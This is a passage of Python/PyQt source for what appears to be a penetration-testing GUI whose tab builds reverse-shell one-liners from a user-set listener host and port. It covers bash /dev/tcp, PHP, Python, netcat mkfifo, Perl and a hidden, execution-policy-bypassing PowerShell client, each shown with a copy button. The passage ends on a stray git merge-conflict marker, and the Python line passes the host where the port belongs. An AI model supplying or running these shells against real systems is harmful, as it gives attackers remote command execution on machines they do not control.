            self.tab6_container_layout.removeWidget(self.bash_Scan1_Copy)
            self.bash_Scan1_Copy.deleteLater()
        self.bash_Scan1_Copy = QPushButton()
        self.bash_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.bash_Scan1_Copy.setFixedSize(QSize(20,20))
        self.bash_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.bash_Scan1.text()))
        self.bash_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # bash_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.bash_Scan1_Copy)
        label_layout.addWidget(self.bash_Scan1)
        self.tab6_container_layout.insertLayout(1, label_layout)
        self.tab6_container_layout.addStretch()

        # bash_Scan2
        if hasattr(self, 'bash_Scan2'):
            self.tab6_container_layout.removeWidget(self.bash_Scan2)
            self.bash_Scan2.deleteLater()
        self.bash_Scan2 = QLabel("bash -c \"bash -i >& /dev/tcp/" + self.lhost + "/" + self.lport + " 0>&1\"")
        self.bash_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # bash_Scan2 copy button
        if hasattr(self, 'bash_Scan2_Copy'):
            self.tab6_container_layout.removeWidget(self.bash_Scan2_Copy)
            self.bash_Scan2_Copy.deleteLater()
        self.bash_Scan2_Copy = QPushButton()
        self.bash_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.bash_Scan2_Copy.setFixedSize(QSize(20,20))
        self.bash_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.bash_Scan2.text()))
        self.bash_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # bash_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.bash_Scan2_Copy)
        label_layout.addWidget(self.bash_Scan2)
        self.tab6_container_layout.insertLayout(2, label_layout)
        self.tab6_container_layout.addStretch()

    # bash_divider 1
        if hasattr(self, 'bash_divider1'):
            self.tab6_container_layout.removeWidget(self.bash_divider1)
            self.bash_divider1.deleteLater()
        self.bash_divider1 = QFrame()
        self.bash_divider1.setFrameShape(QFrame.HLine)
        self.bash_divider1.setLineWidth(3)
        self.bash_divider1.setStyleSheet("color: #20C20E;")
        
        # bash_divider2
        if hasattr(self, 'bash_divider2'):
            self.tab6_container_layout.removeWidget(self.bash_divider2)
            self.bash_divider2.deleteLater()
        self.bash_divider2 = QFrame()
        self.bash_divider2.setFrameShape(QFrame.HLine)
        self.bash_divider2.setLineWidth(3)
        self.bash_divider2.setStyleSheet("color: #20C20E;")
        
        # bash_spacer1
        if hasattr(self, 'bash_spacer1'):
            self.tab6_container_layout.removeWidget(self.bash_spacer1)
            self.bash_spacer1.deleteLater()
        self.bash_spacer1 = QLabel()
        self.bash_spacer1.setFixedWidth(40)
        self.bash_spacer1.setFixedHeight(50)
        
        # bash_spacer2
        if hasattr(self, 'bash_spacer2'):
            self.tab6_container_layout.removeWidget(self.bash_spacer2)
            self.bash_spacer2.deleteLater()
        self.bash_spacer2 = QLabel()
        self.bash_spacer2.setFixedWidth(40)
        self.bash_spacer2.setFixedHeight(50)

        # bash_spacer & divider layout
        self.tab6_container_layout.insertWidget(3, self.bash_spacer1)
        self.tab6_container_layout.insertWidget(4, self.bash_divider1)
        self.tab6_container_layout.insertWidget(5, self.bash_divider2)
        self.tab6_container_layout.insertWidget(6, self.bash_spacer2)
        self.tab6_container_layout.addStretch()

# php
        if hasattr(self, 'php'):
            self.tab6_container_layout.removeWidget(self.php)
            self.php.deleteLater()
        self.php = QLabel("[+ PHP]")
        self.php.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab6_container_layout.insertWidget(7,self.php)

        # php_Scan1
        if hasattr(self, 'php_Scan1'):
            self.tab6_container_layout.removeWidget(self.php_Scan1)
            self.php_Scan1.deleteLater()
        self.php_Scan1 = QLabel("php -r '$sock=fsockopen(\"" + self.lhost + "\"," + self.lport + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
        self.php_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # php_Scan1 copy button
        if hasattr(self, 'php_Scan1_Copy'):
            self.tab6_container_layout.removeWidget(self.php_Scan1_Copy)
            self.php_Scan1_Copy.deleteLater()
        self.php_Scan1_Copy = QPushButton()
        self.php_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.php_Scan1_Copy.setFixedSize(QSize(20,20))
        self.php_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.php_Scan1.text()))
        self.php_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # php_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.php_Scan1_Copy)
        label_layout.addWidget(self.php_Scan1)
        self.tab6_container_layout.insertLayout(8, label_layout)
        self.tab6_container_layout.addStretch()

        # php_divider 1
        if hasattr(self, 'php_divider1'):
            self.tab6_container_layout.removeWidget(self.php_divider1)
            self.php_divider1.deleteLater()
        self.php_divider1 = QFrame()
        self.php_divider1.setFrameShape(QFrame.HLine)
        self.php_divider1.setLineWidth(3)
        self.php_divider1.setStyleSheet("color: #20C20E;")
        
        # php_divider2
        if hasattr(self, 'php_divider2'):
            self.tab6_container_layout.removeWidget(self.php_divider2)
            self.php_divider2.deleteLater()
        self.php_divider2 = QFrame()
        self.php_divider2.setFrameShape(QFrame.HLine)
        self.php_divider2.setLineWidth(3)
        self.php_divider2.setStyleSheet("color: #20C20E;")
        
        # php_spacer1
        if hasattr(self, 'php_spacer1'):
            self.tab6_container_layout.removeWidget(self.php_spacer1)
            self.php_spacer1.deleteLater()
        self.php_spacer1 = QLabel()
        self.php_spacer1.setFixedWidth(40)
        self.php_spacer1.setFixedHeight(50)
        
        # php_spacer2
        if hasattr(self, 'php_spacer2'):
            self.tab6_container_layout.removeWidget(self.php_spacer2)
            self.php_spacer2.deleteLater()
        self.php_spacer2 = QLabel()
        self.php_spacer2.setFixedWidth(40)
        self.php_spacer2.setFixedHeight(50)

        # php_spacer & divider layout
        self.tab6_container_layout.insertWidget(9, self.php_spacer1)
        self.tab6_container_layout.insertWidget(10, self.php_divider1)
        self.tab6_container_layout.insertWidget(11, self.php_divider2)
        self.tab6_container_layout.insertWidget(12, self.php_spacer2)
        self.tab6_container_layout.addStretch() 

# python
        if hasattr(self, 'python'):
            self.tab6_container_layout.removeWidget(self.python)
            self.python.deleteLater()
        self.python = QLabel("[+ Python]")
        self.python.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab6_container_layout.insertWidget(13,self.python)

        # python_Scan1
        if hasattr(self, 'python_Scan1'):
            self.tab6_container_layout.removeWidget(self.python_Scan1)
            self.python_Scan1.deleteLater()
        self.python_Scan1 = QLabel("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + self.lhost + "\"," + self.lhost + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
        self.python_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # python_Scan1 copy button
        if hasattr(self, 'python_Scan1_Copy'):
            self.tab6_container_layout.removeWidget(self.python_Scan1_Copy)
            self.python_Scan1_Copy.deleteLater()
        self.python_Scan1_Copy = QPushButton()
        self.python_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.python_Scan1_Copy.setFixedSize(QSize(20,20))
        self.python_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.python_Scan1.text()))
        self.python_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # python_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.python_Scan1_Copy)
        label_layout.addWidget(self.python_Scan1)
        self.tab6_container_layout.insertLayout(14, label_layout)
        self.tab6_container_layout.addStretch()

        # python_divider 1
        if hasattr(self, 'python_divider1'):
            self.tab6_container_layout.removeWidget(self.python_divider1)
            self.python_divider1.deleteLater()
        self.python_divider1 = QFrame()
        self.python_divider1.setFrameShape(QFrame.HLine)
        self.python_divider1.setLineWidth(3)
        self.python_divider1.setStyleSheet("color: #20C20E;")
        
        # python_divider2
        if hasattr(self, 'python_divider2'):
            self.tab6_container_layout.removeWidget(self.python_divider2)
            self.python_divider2.deleteLater()
        self.python_divider2 = QFrame()
        self.python_divider2.setFrameShape(QFrame.HLine)
        self.python_divider2.setLineWidth(3)
        self.python_divider2.setStyleSheet("color: #20C20E;")
        
        # python_spacer1
        if hasattr(self, 'python_spacer1'):
            self.tab6_container_layout.removeWidget(self.python_spacer1)
            self.python_spacer1.deleteLater()
        self.python_spacer1 = QLabel()
        self.python_spacer1.setFixedWidth(40)
        self.python_spacer1.setFixedHeight(50)
        
        # python_spacer2
        if hasattr(self, 'python_spacer2'):
            self.tab6_container_layout.removeWidget(self.python_spacer2)
            self.python_spacer2.deleteLater()
        self.python_spacer2 = QLabel()
        self.python_spacer2.setFixedWidth(40)
        self.python_spacer2.setFixedHeight(50)

        # python_spacer & divider layout
        self.tab6_container_layout.insertWidget(15, self.python_spacer1)
        self.tab6_container_layout.insertWidget(16, self.python_divider1)
        self.tab6_container_layout.insertWidget(17, self.python_divider2)
        self.tab6_container_layout.insertWidget(18, self.python_spacer2)
        self.tab6_container_layout.addStretch() 

# netcat
        if hasattr(self, 'netcat'):
            self.tab6_container_layout.removeWidget(self.netcat)
            self.netcat.deleteLater()
        self.netcat = QLabel("[+ Netcat]")
        self.netcat.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab6_container_layout.insertWidget(19,self.netcat)

        # netcat_Scan1
        if hasattr(self, 'netcat_Scan1'):
            self.tab6_container_layout.removeWidget(self.netcat_Scan1)
            self.netcat_Scan1.deleteLater()
        self.netcat_Scan1 = QLabel("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + self.lhost + " " + self.lport + " >/tmp/f")
        self.netcat_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # netcat_Scan1 copy button
        if hasattr(self, 'netcat_Scan1_Copy'):
            self.tab6_container_layout.removeWidget(self.netcat_Scan1_Copy)
            self.netcat_Scan1_Copy.deleteLater()
        self.netcat_Scan1_Copy = QPushButton()
        self.netcat_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.netcat_Scan1_Copy.setFixedSize(QSize(20,20))
        self.netcat_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.netcat_Scan1.text()))
        self.netcat_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # netcat_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.netcat_Scan1_Copy)
        label_layout.addWidget(self.netcat_Scan1)
        self.tab6_container_layout.insertLayout(20, label_layout)
        
        self.tab6_container_layout.addStretch()

        # netcat_divider 1
        if hasattr(self, 'netcat_divider1'):
            self.tab6_container_layout.removeWidget(self.netcat_divider1)
            self.netcat_divider1.deleteLater()
        self.netcat_divider1 = QFrame()
        self.netcat_divider1.setFrameShape(QFrame.HLine)
        self.netcat_divider1.setLineWidth(3)
        self.netcat_divider1.setStyleSheet("color: #20C20E;")
        
        # netcat_divider2
        if hasattr(self, 'netcat_divider2'):
            self.tab6_container_layout.removeWidget(self.netcat_divider2)
            self.netcat_divider2.deleteLater()
        self.netcat_divider2 = QFrame()
        self.netcat_divider2.setFrameShape(QFrame.HLine)
        self.netcat_divider2.setLineWidth(3)
        self.netcat_divider2.setStyleSheet("color: #20C20E;")
        
        # netcat_spacer1
        if hasattr(self, 'netcat_spacer1'):
            self.tab6_container_layout.removeWidget(self.netcat_spacer1)
            self.netcat_spacer1.deleteLater()
        self.netcat_spacer1 = QLabel()
        self.netcat_spacer1.setFixedWidth(40)
        self.netcat_spacer1.setFixedHeight(50)
        
        # netcat_spacer2
        if hasattr(self, 'netcat_spacer2'):
            self.tab6_container_layout.removeWidget(self.netcat_spacer2)
            self.netcat_spacer2.deleteLater()
        self.netcat_spacer2 = QLabel()
        self.netcat_spacer2.setFixedWidth(40)
        self.netcat_spacer2.setFixedHeight(50)

        # netcat_spacer & divider layout
        self.tab6_container_layout.insertWidget(21, self.netcat_spacer1)
        self.tab6_container_layout.insertWidget(22, self.netcat_divider1)
        self.tab6_container_layout.insertWidget(23, self.netcat_divider2)
        self.tab6_container_layout.insertWidget(24, self.netcat_spacer2)
        self.tab6_container_layout.addStretch()  

# perl
        if hasattr(self, 'perl'):
            self.tab6_container_layout.removeWidget(self.perl)
            self.perl.deleteLater()
        self.perl = QLabel("[+ Perl]")
        self.perl.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab6_container_layout.insertWidget(25,self.perl)

        # perl_Scan1
        if hasattr(self, 'perl_Scan1'):
            self.tab6_container_layout.removeWidget(self.perl_Scan1)
            self.perl_Scan1.deleteLater()
        self.perl_Scan1 = QLabel("perl -e 'use Socket;$i=\"" + self.lhost + "\";$p=" + self.lport + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))\{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");\};'")
        self.perl_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # perl_Scan1 copy button
        if hasattr(self, 'perl_Scan1_Copy'):
            self.tab6_container_layout.removeWidget(self.perl_Scan1_Copy)
            self.perl_Scan1_Copy.deleteLater()
        self.perl_Scan1_Copy = QPushButton()
        self.perl_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.perl_Scan1_Copy.setFixedSize(QSize(20,20))
        self.perl_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.perl_Scan1.text()))
        self.perl_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # perl_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.perl_Scan1_Copy)
        label_layout.addWidget(self.perl_Scan1)
        self.tab6_container_layout.insertLayout(26, label_layout)
        self.tab6_container_layout.addStretch()

        # perl_divider 1
        if hasattr(self, 'perl_divider1'):
            self.tab6_container_layout.removeWidget(self.perl_divider1)
            self.perl_divider1.deleteLater()
        self.perl_divider1 = QFrame()
        self.perl_divider1.setFrameShape(QFrame.HLine)
        self.perl_divider1.setLineWidth(3)
        self.perl_divider1.setStyleSheet("color: #20C20E;")
        
        # perl_divider2
        if hasattr(self, 'perl_divider2'):
            self.tab6_container_layout.removeWidget(self.perl_divider2)
            self.perl_divider2.deleteLater()
        self.perl_divider2 = QFrame()
        self.perl_divider2.setFrameShape(QFrame.HLine)
        self.perl_divider2.setLineWidth(3)
        self.perl_divider2.setStyleSheet("color: #20C20E;")
        
        # perl_spacer1
        if hasattr(self, 'perl_spacer1'):
            self.tab6_container_layout.removeWidget(self.perl_spacer1)
            self.perl_spacer1.deleteLater()
        self.perl_spacer1 = QLabel()
        self.perl_spacer1.setFixedWidth(40)
        self.perl_spacer1.setFixedHeight(50)
        
        # perl_spacer2
        if hasattr(self, 'perl_spacer2'):
            self.tab6_container_layout.removeWidget(self.perl_spacer2)
            self.perl_spacer2.deleteLater()
        self.perl_spacer2 = QLabel()
        self.perl_spacer2.setFixedWidth(40)
        self.perl_spacer2.setFixedHeight(50)

        # perl_spacer & divider layout
        self.tab6_container_layout.insertWidget(27, self.perl_spacer1)
        self.tab6_container_layout.insertWidget(28, self.perl_divider1)
        self.tab6_container_layout.insertWidget(29, self.perl_divider2)
        self.tab6_container_layout.insertWidget(30, self.perl_spacer2)
        self.tab6_container_layout.addStretch()
        
# ps
        if hasattr(self, 'ps'):
            self.tab6_container_layout.removeWidget(self.ps)
            self.ps.deleteLater()
        self.ps = QLabel("[+ Powershell]")
        self.ps.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab6_container_layout.insertWidget(31,self.ps)

        # ps_Scan1
        if hasattr(self, 'ps_Scan1'):
            self.tab6_container_layout.removeWidget(self.ps_Scan1)
            self.ps_Scan1.deleteLater()
        self.ps_Scan1 = QLabel("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"" + self.lhost + "," + self.lport + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")
        self.ps_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # ps_Scan1 copy button
        if hasattr(self, 'ps_Scan1_Copy'):
            self.tab6_container_layout.removeWidget(self.ps_Scan1_Copy)
            self.ps_Scan1_Copy.deleteLater()
        self.ps_Scan1_Copy = QPushButton()
        self.ps_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.ps_Scan1_Copy.setFixedSize(QSize(20,20))
        self.ps_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.ps_Scan1.text()))
        self.ps_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # ps_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.ps_Scan1_Copy)
        label_layout.addWidget(self.ps_Scan1)
        self.tab6_container_layout.insertLayout(32, label_layout)
        self.tab6_container_layout.addStretch()
        
        # ps_divider 1
        if hasattr(self, 'ps_divider1'):
            self.tab6_container_layout.removeWidget(self.ps_divider1)
            self.ps_divider1.deleteLater()
        self.ps_divider1 = QFrame()
        self.ps_divider1.setFrameShape(QFrame.HLine)
        self.ps_divider1.setLineWidth(3)
        self.ps_divider1.setStyleSheet("color: #20C20E;")
        
        # ps_divider2
        if hasattr(self, 'ps_divider2'):
            self.tab6_container_layout.removeWidget(self.ps_divider2)
            self.ps_divider2.deleteLater()
        self.ps_divider2 = QFrame()
        self.ps_divider2.setFrameShape(QFrame.HLine)
        self.ps_divider2.setLineWidth(3)
        self.ps_divider2.setStyleSheet("color: #20C20E;")
        
        # ps_spacer1
        if hasattr(self, 'ps_spacer1'):
            self.tab6_container_layout.removeWidget(self.ps_spacer1)
            self.ps_spacer1.deleteLater()
        self.ps_spacer1 = QLabel()
        self.ps_spacer1.setFixedWidth(40)
        self.ps_spacer1.setFixedHeight(50)
        
        # ps_spacer2
        if hasattr(self, 'ps_spacer2'):
            self.tab6_container_layout.removeWidget(self.ps_spacer2)
            self.ps_spacer2.deleteLater()
        self.ps_spacer2 = QLabel()
        self.ps_spacer2.setFixedWidth(40)
        self.ps_spacer2.setFixedHeight(50)

        # ps_spacer & divider layout
        self.tab6_container_layout.insertWidget(33, self.ps_spacer1)
        self.tab6_container_layout.insertWidget(34, self.ps_divider1)
        self.tab6_container_layout.insertWidget(35, self.ps_divider2)
        self.tab6_container_layout.insertWidget(36, self.ps_spacer2)
        self.tab6_container_layout.addStretch()

if __name__ == '__main__':
    app = QApplication(sys.argv)
    main_window = MainWindow()
    main_window.show()
    sys.exit(app.exec_())
>>>>>>> 1509ee17b44fc71102be71b84fd37e22ae293d89
